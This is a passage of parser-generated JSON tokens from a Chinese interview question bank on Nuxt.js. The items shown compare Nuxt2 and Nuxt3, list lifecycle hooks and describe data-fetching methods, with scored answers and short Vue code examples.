的生态（如插件、模块）结合时可能会遇到一些兼容性问题。\\n","task":false,"loose":false,"text":"**1：** Composition API 和 Options API：<br/>\\n&emsp;Nuxt3：更加强调使用 Composition API。它提供了一系列的组合式函数，如useFetch用于数据获取，useState用于状态管理等。这些函数使得组件逻辑更加清晰，可\\n复用性更强。例如，useFetch可以在组件中轻松地获取数据，并且可以在多个组件中复用这个数据获取逻辑，而不需要像 Nuxt2 那样可能更多地依赖于 Options API 中\\n的mounted等生命周期钩子来实现相同的功能。<br/>\\n&emsp;Nuxt2：主要使用 Options API，通过data、methods、mounted等选项来定义组件。虽然也可以使用 Composition API，但没有 Nuxt3 那么自然和方便。\\n例如，在 Nuxt2 中使用 Composition API 可能需要额外引入 Vue 3 的相关 API，并且在与 Nuxt2 的生态（如插件、模块）结合时可能会遇到一些兼容性问题。","tokens":[{"type":"text","raw":"**1：** Composition API 和 Options API：<br/>\\n\\n&emsp;Nuxt3：更加强调使用 Composition API。它提供了一系列的组合式函数，如useFetch用于数据获取，useState用于状态管理等。这些函数使得组件逻辑更加清晰，可\\n\\n复用性更强。例如，useFetch可以在组件中轻松地获取数据，并且可以在多个组件中复用这个数据获取逻辑，而不需要像 Nuxt2 那样可能更多地依赖于 Options API 中\\n\\n的mounted等生命周期钩子来实现相同的功能。<br/>\\n\\n&emsp;Nuxt2：主要使用 Options API，通过data、methods、mounted等选项来定义组件。虽然也可以使用 Composition API，但没有 Nuxt3 那么自然和方便。\\n\\n例如，在 Nuxt2 中使用 Composition API 可能需要额外引入 Vue 3 的相关 API，并且在与 Nuxt2 的生态（如插件、模块）结合时可能会遇到一些兼容性问题。","text":"**1：** Composition API 和 Options API：<br/>\\n&emsp;Nuxt3：更加强调使用 Composition API。它提供了一系列的组合式函数，如useFetch用于数据获取，useState用于状态管理等。这些函数使得组件逻辑更加清晰，可\\n复用性更强。例如，useFetch可以在组件中轻松地获取数据，并且可以在多个组件中复用这个数据获取逻辑，而不需要像 Nuxt2 那样可能更多地依赖于 Options API 中\\n的mounted等生命周期钩子来实现相同的功能。<br/>\\n&emsp;Nuxt2：主要使用 Options API，通过data、methods、mounted等选项来定义组件。虽然也可以使用 Composition API，但没有 Nuxt3 那么自然和方便。\\n例如，在 Nuxt2 中使用 Composition API 可能需要额外引入 Vue 3 的相关 API，并且在与 Nuxt2 的生态（如插件、模块）结合时可能会遇到一些兼容性问题。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Composition API 和 Options API：","text":" Composition API 和 Options API：","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;Nuxt3：更加强调使用 Composition API。它提供了一系列的组合式函数，如useFetch用于数据获取，useState用于状态管理等。这些函数使得组件逻辑更加清晰，可\\n复用性更强。例如，useFetch可以在组件中轻松地获取数据，并且可以在多个组件中复用这个数据获取逻辑，而不需要像 Nuxt2 那样可能更多地依赖于 Options API 中\\n的mounted等生命周期钩子来实现相同的功能。","text":"\\n&emsp;Nuxt3：更加强调使用 Composition API。它提供了一系列的组合式函数，如useFetch用于数据获取，useState用于状态管理等。这些函数使得组件逻辑更加清晰，可\\n复用性更强。例如，useFetch可以在组件中轻松地获取数据，并且可以在多个组件中复用这个数据获取逻辑，而不需要像 Nuxt2 那样可能更多地依赖于 Options API 中\\n的mounted等生命周期钩子来实现相同的功能。","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;Nuxt2：主要使用 Options API，通过data、methods、mounted等选项来定义组件。虽然也可以使用 Composition API，但没有 Nuxt3 那么自然和方便。\\n例如，在 Nuxt2 中使用 Composition API 可能需要额外引入 Vue 3 的相关 API，并且在与 Nuxt2 的生态（如插件、模块）结合时可能会遇到一些兼容性问题。","text":"\\n&emsp;Nuxt2：主要使用 Options API，通过data、methods、mounted等选项来定义组件。虽然也可以使用 Composition API，但没有 Nuxt3 那么自然和方便。\\n例如，在 Nuxt2 中使用 Composition API 可能需要额外引入 Vue 3 的相关 API，并且在与 Nuxt2 的生态（如插件、模块）结合时可能会遇到一些兼容性问题。","escaped":false}]}]},{"type":"list_item","raw":"* **2：** Server - side Rendering (SSR) 和 Static Site Generation (SSG)：<br/>\\n&emsp;Nuxt3：在 SSR 和 SSG 方面有一些改进。它提供了更灵活的生成策略，例如在 SSG 中可以更好地控制预渲染的页面和数据获取方式。对于动态路由的 SSG，Nuxt3 能\\n够根据不同的参数更高效地生成页面。在 SSR 模式下，Nuxt3 也优化了服务器端渲染的性能和资源利用。<br/>\\n&emsp;Nuxt2：支持 SSR 和 SSG，但在一些复杂的场景下，如动态路由的预渲染和数据获取策略上相对 Nuxt3 不够灵活。例如，在 Nuxt2 中处理动态路由的 SSG 可能需要\\n更多的手动配置和复杂的逻辑来确保数据的正确获取和页面的预渲染。","task":false,"loose":false,"text":"**2：** Server - side Rendering (SSR) 和 Static Site Generation (SSG)：<br/>\\n&emsp;Nuxt3：在 SSR 和 SSG 方面有一些改进。它提供了更灵活的生成策略，例如在 SSG 中可以更好地控制预渲染的页面和数据获取方式。对于动态路由的 SSG，Nuxt3 能\\n够根据不同的参数更高效地生成页面。在 SSR 模式下，Nuxt3 也优化了服务器端渲染的性能和资源利用。<br/>\\n&emsp;Nuxt2：支持 SSR 和 SSG，但在一些复杂的场景下，如动态路由的预渲染和数据获取策略上相对 Nuxt3 不够灵活。例如，在 Nuxt2 中处理动态路由的 SSG 可能需要\\n更多的手动配置和复杂的逻辑来确保数据的正确获取和页面的预渲染。","tokens":[{"type":"text","raw":"**2：** Server - side Rendering (SSR) 和 Static Site Generation (SSG)：<br/>\\n\\n&emsp;Nuxt3：在 SSR 和 SSG 方面有一些改进。它提供了更灵活的生成策略，例如在 SSG 中可以更好地控制预渲染的页面和数据获取方式。对于动态路由的 SSG，Nuxt3 能\\n\\n够根据不同的参数更高效地生成页面。在 SSR 模式下，Nuxt3 也优化了服务器端渲染的性能和资源利用。<br/>\\n\\n&emsp;Nuxt2：支持 SSR 和 SSG，但在一些复杂的场景下，如动态路由的预渲染和数据获取策略上相对 Nuxt3 不够灵活。例如，在 Nuxt2 中处理动态路由的 SSG 可能需要\\n\\n更多的手动配置和复杂的逻辑来确保数据的正确获取和页面的预渲染。","text":"**2：** Server - side Rendering (SSR) 和 Static Site Generation (SSG)：<br/>\\n&emsp;Nuxt3：在 SSR 和 SSG 方面有一些改进。它提供了更灵活的生成策略，例如在 SSG 中可以更好地控制预渲染的页面和数据获取方式。对于动态路由的 SSG，Nuxt3 能\\n够根据不同的参数更高效地生成页面。在 SSR 模式下，Nuxt3 也优化了服务器端渲染的性能和资源利用。<br/>\\n&emsp;Nuxt2：支持 SSR 和 SSG，但在一些复杂的场景下，如动态路由的预渲染和数据获取策略上相对 Nuxt3 不够灵活。例如，在 Nuxt2 中处理动态路由的 SSG 可能需要\\n更多的手动配置和复杂的逻辑来确保数据的正确获取和页面的预渲染。","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" Server - side Rendering (SSR) 和 Static Site Generation (SSG)：","text":" Server - side Rendering (SSR) 和 Static Site Generation (SSG)：","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;Nuxt3：在 SSR 和 SSG 方面有一些改进。它提供了更灵活的生成策略，例如在 SSG 中可以更好地控制预渲染的页面和数据获取方式。对于动态路由的 SSG，Nuxt3 能\\n够根据不同的参数更高效地生成页面。在 SSR 模式下，Nuxt3 也优化了服务器端渲染的性能和资源利用。","text":"\\n&emsp;Nuxt3：在 SSR 和 SSG 方面有一些改进。它提供了更灵活的生成策略，例如在 SSG 中可以更好地控制预渲染的页面和数据获取方式。对于动态路由的 SSG，Nuxt3 能\\n够根据不同的参数更高效地生成页面。在 SSR 模式下，Nuxt3 也优化了服务器端渲染的性能和资源利用。","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;Nuxt2：支持 SSR 和 SSG，但在一些复杂的场景下，如动态路由的预渲染和数据获取策略上相对 Nuxt3 不够灵活。例如，在 Nuxt2 中处理动态路由的 SSG 可能需要\\n更多的手动配置和复杂的逻辑来确保数据的正确获取和页面的预渲染。","text":"\\n&emsp;Nuxt2：支持 SSR 和 SSG，但在一些复杂的场景下，如动态路由的预渲染和数据获取策略上相对 Nuxt3 不够灵活。例如，在 Nuxt2 中处理动态路由的 SSG 可能需要\\n更多的手动配置和复杂的逻辑来确保数据的正确获取和页面的预渲染。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>\\n\\n","pre":false,"text":"</details>\\n\\n"},{"type":"heading","raw":"## Nuxt.js的生命周期有哪些？\\n\\n","depth":2,"text":"Nuxt.js的生命周期有哪些？","tokens":[{"type":"text","raw":"Nuxt.js的生命周期有哪些？","text":"Nuxt.js的生命周期有哪些？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（5 分）\\n\\n","depth":4,"text":"解答（5 分）","tokens":[{"type":"text","raw":"解答（5 分）","text":"解答（5 分）","escaped":false}]},{"type":"list","raw":"* **1：** 服务器端生命周期：\\n  + nuxtServerInit：在服务端初始化数据\\n  + middleware：中间件执行\\n  + validate()：验证动态路由参数\\n  + asyncData()：异步数据加载\\n  + fetch()：服务端数据获取\\n\\n* **1：** Vue生命周期（服务端）：\\n  + beforeCreate：组件实例化之前\\n  + created：组件创建完成\\n\\n* **1：** Vue生命周期（客户端）：\\n  + beforeMount：DOM挂载之前\\n  + mounted：DOM挂载完成\\n  + beforeUpdate：数据更新前\\n  + updated：数据更新后\\n\\n* **1：** 页面特定钩子：\\n  + transition：页面过渡效果\\n  + head：设置页面元信息\\n\\n* **1：** 注意事项：\\n  + 服务端只能访问beforeCreate和created\\n  + window/document只能在mounted中使用\\n  + asyncData/fetch在每次路由变化时都会调用","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"* **1：** 服务器端生命周期：\\n  + nuxtServerInit：在服务端初始化数据\\n  + middleware：中间件执行\\n  + validate()：验证动态路由参数\\n  + asyncData()：异步数据加载\\n  + fetch()：服务端数据获取\\n\\n","task":false,"loose":true,"text":"**1：** 服务器端生命周期：\\n+ nuxtServerInit：在服务端初始化数据\\n+ middleware：中间件执行\\n+ validate()：验证动态路由参数\\n+ asyncData()：异步数据加载\\n+ fetch()：服务端数据获取\\n","tokens":[{"type":"text","raw":"**1：** 服务器端生命周期：\\n","text":"**1：** 服务器端生命周期：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 服务器端生命周期：","text":" 服务器端生命周期：","escaped":false}]},{"type":"list","raw":"+ nuxtServerInit：在服务端初始化数据\\n+ middleware：中间件执行\\n+ validate()：验证动态路由参数\\n+ asyncData()：异步数据加载\\n+ fetch()：服务端数据获取\\n","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ nuxtServerInit：在服务端初始化数据\\n","task":false,"loose":false,"text":"nuxtServerInit：在服务端初始化数据","tokens":[{"type":"text","raw":"nuxtServerInit：在服务端初始化数据","text":"nuxtServerInit：在服务端初始化数据","tokens":[{"type":"text","raw":"nuxtServerInit：在服务端初始化数据","text":"nuxtServerInit：在服务端初始化数据","escaped":false}]}]},{"type":"list_item","raw":"+ middleware：中间件执行\\n","task":false,"loose":false,"text":"middleware：中间件执行","tokens":[{"type":"text","raw":"middleware：中间件执行","text":"middleware：中间件执行","tokens":[{"type":"text","raw":"middleware：中间件执行","text":"middleware：中间件执行","escaped":false}]}]},{"type":"list_item","raw":"+ validate()：验证动态路由参数\\n","task":false,"loose":false,"text":"validate()：验证动态路由参数","tokens":[{"type":"text","raw":"validate()：验证动态路由参数","text":"validate()：验证动态路由参数","tokens":[{"type":"text","raw":"validate()：验证动态路由参数","text":"validate()：验证动态路由参数","escaped":false}]}]},{"type":"list_item","raw":"+ asyncData()：异步数据加载\\n","task":false,"loose":false,"text":"asyncData()：异步数据加载","tokens":[{"type":"text","raw":"asyncData()：异步数据加载","text":"asyncData()：异步数据加载","tokens":[{"type":"text","raw":"asyncData()：异步数据加载","text":"asyncData()：异步数据加载","escaped":false}]}]},{"type":"list_item","raw":"+ fetch()：服务端数据获取","task":false,"loose":false,"text":"fetch()：服务端数据获取","tokens":[{"type":"text","raw":"fetch()：服务端数据获取","text":"fetch()：服务端数据获取","tokens":[{"type":"text","raw":"fetch()：服务端数据获取","text":"fetch()：服务端数据获取","escaped":false}]}]}]}]},{"type":"list_item","raw":"* **1：** Vue生命周期（服务端）：\\n  + beforeCreate：组件实例化之前\\n  + created：组件创建完成\\n\\n","task":false,"loose":true,"text":"**1：** Vue生命周期（服务端）：\\n+ beforeCreate：组件实例化之前\\n+ created：组件创建完成\\n","tokens":[{"type":"text","raw":"**1：** Vue生命周期（服务端）：\\n","text":"**1：** Vue生命周期（服务端）：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Vue生命周期（服务端）：","text":" Vue生命周期（服务端）：","escaped":false}]},{"type":"list","raw":"+ beforeCreate：组件实例化之前\\n+ created：组件创建完成\\n","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ beforeCreate：组件实例化之前\\n","task":false,"loose":false,"text":"beforeCreate：组件实例化之前","tokens":[{"type":"text","raw":"beforeCreate：组件实例化之前","text":"beforeCreate：组件实例化之前","tokens":[{"type":"text","raw":"beforeCreate：组件实例化之前","text":"beforeCreate：组件实例化之前","escaped":false}]}]},{"type":"list_item","raw":"+ created：组件创建完成","task":false,"loose":false,"text":"created：组件创建完成","tokens":[{"type":"text","raw":"created：组件创建完成","text":"created：组件创建完成","tokens":[{"type":"text","raw":"created：组件创建完成","text":"created：组件创建完成","escaped":false}]}]}]}]},{"type":"list_item","raw":"* **1：** Vue生命周期（客户端）：\\n  + beforeMount：DOM挂载之前\\n  + mounted：DOM挂载完成\\n  + beforeUpdate：数据更新前\\n  + updated：数据更新后\\n\\n","task":false,"loose":true,"text":"**1：** Vue生命周期（客户端）：\\n+ beforeMount：DOM挂载之前\\n+ mounted：DOM挂载完成\\n+ beforeUpdate：数据更新前\\n+ updated：数据更新后\\n","tokens":[{"type":"text","raw":"**1：** Vue生命周期（客户端）：\\n","text":"**1：** Vue生命周期（客户端）：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Vue生命周期（客户端）：","text":" Vue生命周期（客户端）：","escaped":false}]},{"type":"list","raw":"+ beforeMount：DOM挂载之前\\n+ mounted：DOM挂载完成\\n+ beforeUpdate：数据更新前\\n+ updated：数据更新后\\n","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ beforeMount：DOM挂载之前\\n","task":false,"loose":false,"text":"beforeMount：DOM挂载之前","tokens":[{"type":"text","raw":"beforeMount：DOM挂载之前","text":"beforeMount：DOM挂载之前","tokens":[{"type":"text","raw":"beforeMount：DOM挂载之前","text":"beforeMount：DOM挂载之前","escaped":false}]}]},{"type":"list_item","raw":"+ mounted：DOM挂载完成\\n","task":false,"loose":false,"text":"mounted：DOM挂载完成","tokens":[{"type":"text","raw":"mounted：DOM挂载完成","text":"mounted：DOM挂载完成","tokens":[{"type":"text","raw":"mounted：DOM挂载完成","text":"mounted：DOM挂载完成","escaped":false}]}]},{"type":"list_item","raw":"+ beforeUpdate：数据更新前\\n","task":false,"loose":false,"text":"beforeUpdate：数据更新前","tokens":[{"type":"text","raw":"beforeUpdate：数据更新前","text":"beforeUpdate：数据更新前","tokens":[{"type":"text","raw":"beforeUpdate：数据更新前","text":"beforeUpdate：数据更新前","escaped":false}]}]},{"type":"list_item","raw":"+ updated：数据更新后","task":false,"loose":false,"text":"updated：数据更新后","tokens":[{"type":"text","raw":"updated：数据更新后","text":"updated：数据更新后","tokens":[{"type":"text","raw":"updated：数据更新后","text":"updated：数据更新后","escaped":false}]}]}]}]},{"type":"list_item","raw":"* **1：** 页面特定钩子：\\n  + transition：页面过渡效果\\n  + head：设置页面元信息\\n\\n","task":false,"loose":true,"text":"**1：** 页面特定钩子：\\n+ transition：页面过渡效果\\n+ head：设置页面元信息\\n","tokens":[{"type":"text","raw":"**1：** 页面特定钩子：\\n","text":"**1：** 页面特定钩子：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 页面特定钩子：","text":" 页面特定钩子：","escaped":false}]},{"type":"list","raw":"+ transition：页面过渡效果\\n+ head：设置页面元信息\\n","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ transition：页面过渡效果\\n","task":false,"loose":false,"text":"transition：页面过渡效果","tokens":[{"type":"text","raw":"transition：页面过渡效果","text":"transition：页面过渡效果","tokens":[{"type":"text","raw":"transition：页面过渡效果","text":"transition：页面过渡效果","escaped":false}]}]},{"type":"list_item","raw":"+ head：设置页面元信息","task":false,"loose":false,"text":"head：设置页面元信息","tokens":[{"type":"text","raw":"head：设置页面元信息","text":"head：设置页面元信息","tokens":[{"type":"text","raw":"head：设置页面元信息","text":"head：设置页面元信息","escaped":false}]}]}]}]},{"type":"list_item","raw":"* **1：** 注意事项：\\n  + 服务端只能访问beforeCreate和created\\n  + window/document只能在mounted中使用\\n  + asyncData/fetch在每次路由变化时都会调用","task":false,"loose":true,"text":"**1：** 注意事项：\\n+ 服务端只能访问beforeCreate和created\\n+ window/document只能在mounted中使用\\n+ asyncData/fetch在每次路由变化时都会调用","tokens":[{"type":"text","raw":"**1：** 注意事项：\\n","text":"**1：** 注意事项：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 注意事项：","text":" 注意事项：","escaped":false}]},{"type":"list","raw":"+ 服务端只能访问beforeCreate和created\\n+ window/document只能在mounted中使用\\n+ asyncData/fetch在每次路由变化时都会调用","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 服务端只能访问beforeCreate和created\\n","task":false,"loose":false,"text":"服务端只能访问beforeCreate和created","tokens":[{"type":"text","raw":"服务端只能访问beforeCreate和created","text":"服务端只能访问beforeCreate和created","tokens":[{"type":"text","raw":"服务端只能访问beforeCreate和created","text":"服务端只能访问beforeCreate和created","escaped":false}]}]},{"type":"list_item","raw":"+ window/document只能在mounted中使用\\n","task":false,"loose":false,"text":"window/document只能在mounted中使用","tokens":[{"type":"text","raw":"window/document只能在mounted中使用","text":"window/document只能在mounted中使用","tokens":[{"type":"text","raw":"window/document只能在mounted中使用","text":"window/document只能在mounted中使用","escaped":false}]}]},{"type":"list_item","raw":"+ asyncData/fetch在每次路由变化时都会调用","task":false,"loose":false,"text":"asyncData/fetch在每次路由变化时都会调用","tokens":[{"type":"text","raw":"asyncData/fetch在每次路由变化时都会调用","text":"asyncData/fetch在每次路由变化时都会调用","tokens":[{"type":"text","raw":"asyncData/fetch在每次路由变化时都会调用","text":"asyncData/fetch在每次路由变化时都会调用","escaped":false}]}]}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## Nuxt.js中的数据获取方式有哪些？\\n\\n","depth":2,"text":"Nuxt.js中的数据获取方式有哪些？","tokens":[{"type":"text","raw":"Nuxt.js中的数据获取方式有哪些？","text":"Nuxt.js中的数据获取方式有哪些？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（4 分）\\n\\n","depth":4,"text":"解答（4 分）","tokens":[{"type":"text","raw":"解答（4 分）","text":"解答（4 分）","escaped":false}]},{"type":"list","raw":"* **1：** asyncData方法：\\n  + 在组件初始化前调用\\n  + 可以返回Promise\\n  + 返回的数据会合并到组件data中\\n  + 只能在页面组件中使用\\n\\n  ```js\\n  async asyncData({ $axios }) {\\n    const data = await $axios.$get(\'/api/data\')\\n    return { data }\\n  }\\n  ```\\n\\n* **1：** fetch方法：\\n  + 可在任何组件中使用\\n  + 不直接返回数据\\n  + 通常用于填充Vuex状态\\n\\n  ```js\\n  async fetch() {\\n    const { data } = await this.$axios.$get(\'/api/data\')\\n    this.items = data\\n  }\\n  ```\\n\\n* **1：** Vuex操作：\\n  + nuxtServerInit初始化存储\\n  + store中的actions获取数据\\n  + 支持模块化管理\\n\\n  ```js\\n  export const actions = {\\n    async fetchData({ commit }) {\\n      const data = await this.$axios.$get(\'/api/data\')\\n      commit(\'SET_DATA\', data)\\n    }\\n  }\\n  ```\\n\\n* **1：** API调用最佳实践：\\n  + 使用@nuxtjs/axios模块\\n  + 统一管理API请求\\n  + 处理错误和加载状态\\n  + 实现数据缓存策略","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"* **1：** asyncData方法：\\n  + 在组件初始化前调用\\n  + 可以返回Promise\\n  + 返回的数据会合并到组件data中\\n  + 只能在页面组件中使用\\n\\n  ```js\\n  async asyncData({ $axios }) {\\n    const data = await $axios.$get(\'/api/data\')\\n    return { data }\\n  }\\n  ```\\n\\n","task":false,"loose":true,"text":"**1：** asyncData方法：\\n+ 在组件初始化前调用\\n+ 可以返回Promise\\n+ 返回的数据会合并到组件data中\\n+ 只能在页面组件中使用\\n\\n```js\\nasync asyncData({ $axios }) {\\n  const data = await $axios.$get(\'/api/data\')\\n  return { data }\\n}\\n```\\n","tokens":[{"type":"text","raw":"**1：** asyncData方法：\\n","text":"**1：** asyncData方法：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" asyncData方法：","text":" asyncData方法：","escaped":false}]},{"type":"list","raw":"+ 在组件初始化前调用\\n+ 可以返回Promise\\n+ 返回的数据会合并到组件data中\\n+ 只能在页面组件中使用","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 在组件初始化前调用\\n","task":false,"loose":false,"text":"在组件初始化前调用","tokens":[{"type":"text","raw":"在组件初始化前调用","text":"在组件初始化前调用","tokens":[{"type":"text","raw":"在组件初始化前调用","text":"在组件初始化前调用","escaped":false}]}]},{"type":"list_item","raw":"+ 可以返回Promise\\n","task":false,"loose":false,"text":"可以返回Promise","tokens":[{"type":"text","raw":"可以返回Promise","text":"可以返回Promise","tokens":[{"type":"text","raw":"可以返回Promise","text":"可以返回Promise","escaped":false}]}]},{"type":"list_item","raw":"+ 返回的数据会合并到组件data中\\n","task":false,"loose":false,"text":"返回的数据会合并到组件data中","tokens":[{"type":"text","raw":"返回的数据会合并到组件data中","text":"返回的数据会合并到组件data中","tokens":[{"type":"text","raw":"返回的数据会合并到组件data中","text":"返回的数据会合并到组件data中","escaped":false}]}]},{"type":"list_item","raw":"+ 只能在页面组件中使用","task":false,"loose":false,"text":"只能在页面组件中使用","tokens":[{"type":"text","raw":"只能在页面组件中使用","text":"只能在页面组件中使用","tokens":[{"type":"text","raw":"只能在页面组件中使用","text":"只能在页面组件中使用","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nasync asyncData({ $axios }) {\\n  const data = await $axios.$get(\'/api/data\')\\n  return { data }\\n}\\n```\\n","lang":"js","text":"async asyncData({ $axios }) {\\n  const data = await $axios.$get(\'/api/data\')\\n  return { data }\\n}"}]},{"type":"list_item","raw":"* **1：** fetch方法：\\n  + 可在任何组件中使用\\n  + 不直接返回数据\\n  + 通常用于填充Vuex状态\\n\\n  ```js\\n  async fetch() {\\n    const { data } = await this.$axios.$get(\'/api/data\')\\n    this.items = data\\n  }\\n  ```\\n\\n","task":false,"loose":true,"text":"**1：** fetch方法：\\n+ 可在任何组件中使用\\n+ 不直接返回数据\\n+ 通常用于填充Vuex状态\\n\\n```js\\nasync fetch() {\\n  const { data } = await this.$axios.$get(\'/api/data\')\\n  this.items = data\\n}\\n```\\n","tokens":[{"type":"text","raw":"**1：** fetch方法：\\n","text":"**1：** fetch方法：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" fetch方法：","text":" fetch方法：","escaped":false}]},{"type":"list","raw":"+ 可在任何组件中使用\\n+ 不直接返回数据\\n+ 通常用于填充Vuex状态","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 可在任何组件中使用\\n","task":false,"loose":false,"text":"可在任何组件中使用","tokens":[{"type":"text","raw":"可在任何组件中使用","text":"可在任何组件中使用","tokens":[{"type":"text","raw":"可在任何组件中使用","text":"可在任何组件中使用","escaped":false}]}]},{"type":"list_item","raw":"+ 不直接返回数据\\n","task":false,"loose":false,"text":"不直接返回数据","tokens":[{"type":"text","raw":"不直接返回数据","text":"不直接返回数据","tokens":[{"type":"text","raw":"不直接返回数据","text":"不直接返回数据","escaped":false}]}]},{"type":"list_item","raw":"+ 通常用于填充Vuex状态","task":false,"loose":false,"text":"通常用于填充Vuex状态","tokens":[{"type":"text","raw":"通常用于填充Vuex状态","text":"通常用于填充Vuex状态","tokens":[{"type":"text","raw":"通常用于填充Vuex状态","text":"通常用于填充Vuex状态","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nasync fetch() {\\n  const { data } = await this.$axios.$get(\'/api/data\')\\n  this.items = data\\n}\\n```\\n","lang":"js","text":"async fetch() {\\n  const { data } = await this.$axios.$get(\'/api/data\')\\n  this.items = data\\n}"}]},{"type":"list_item","raw":"* **1：** Vuex操作：\\n  + nuxtServerInit初始化存储\\n  + store中的actions获取数据\\n  + 支持模块化管理\\n\\n  ```js\\n  export const actions = {\\n    async fetchData({ commit }) {\\n      const data = await this.$axios.$get(\'/api/data\')\\n      commit(\'SET_DATA\', data)\\n    }\\n  }\\n  ```\\n\\n","task":false,"loose":true,"text":"**1：** Vuex操作：\\n+ nuxtServerInit初始化存储\\n+ store中的actions获取数据\\n+ 支持模块化管理\\n\\n```js\\nexport const actions = {\\n  async fetchData({ commit }) {\\n    const data = await this.$axios.$get(\'/api/data\')\\n    commit(\'SET_DATA\', data)\\n  }\\n}\\n```\\n","tokens":[{"type":"text","raw":"**1：** Vuex操作：\\n","text":"**1：** Vuex操作：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Vuex操作：","text":" Vuex操作：","escaped":false}]},{"type":"list","raw":"+ nuxtServerInit初始化存储\\n+ store中的actions获取数据\\n+ 支持模块化管理","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ nuxtServerInit初始化存储\\n","task":false,"loose":false,"text":"nuxtServerInit初始化存储","tokens":[{"type":"text","raw":"nuxtServerInit初始化存储","text":"nuxtServerInit初始化存储","tokens":[{"type":"text","raw":"nuxtServerInit初始化存储","text":"nuxtServerInit初始化存储","escaped":false}]}]},{"type":"list_item","raw":"+ store中的actions获取数据\\n","task":false,"loose":false,"text":"store中的actions获取数据","tokens":[{"type":"text","raw":"store中的actions获取数据","text":"store中的actions获取数据","tokens":[{"type":"text","raw":"store中的actions获取数据","text":"store中的actions获取数据","escaped":false}]}]},{"type":"list_item","raw":"+ 